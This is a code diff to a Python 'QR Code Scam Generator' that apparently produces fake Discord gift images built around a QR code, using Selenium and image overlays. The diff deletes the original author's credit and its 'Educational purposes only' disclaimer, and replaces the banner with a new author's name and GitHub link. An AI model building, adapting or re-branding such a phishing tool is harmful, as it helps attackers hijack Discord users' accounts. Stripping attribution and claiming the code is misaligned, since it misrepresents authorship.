@@ -5,9 +5,6 @@ import base64
 import time
 import os
 
-# Developer: NightfallGT
-# Educational purposes only
-
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
     im2 = Image.open('temp/overlay.png', 'r')
@@ -22,7 +19,7 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam\n')
+    print('Made By: Kush-0009\n GitHub: https://github.com/Kush-009/\n')
     print('** QR Code Scam Generator **')
 
     options = webdriver.ChromeOptions()
